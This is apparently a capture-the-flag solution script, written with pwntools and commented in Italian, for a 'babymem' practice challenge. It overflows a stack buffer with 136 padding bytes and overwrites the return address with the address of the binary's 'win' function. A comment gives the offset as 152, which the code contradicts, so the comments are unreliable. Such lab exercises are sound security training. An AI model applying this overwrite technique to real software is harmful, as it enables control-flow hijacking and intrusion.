from pwn import *

elf = ELF("/challenge/babymem-level-3-0")
p = elf.process()

# Dimensione della linea
p.sendline(b"5000")

# Stampa tutta l'stdout
# print(p.clean())

# Dizionario che contiene tutti i simboli e valori relativi
print(hex(elf.symbols["win"]))

# Sappiamo che il payload deve cominciare con 152 e poi l'indirizzo di ritorno della funzione win
# p64 fa il packing da intero a indirizzo, little endian
payload = b"A"*136 + p64(elf.symbols["win"])

# Mandare il payload
p.sendline(payload)

p.interactive()
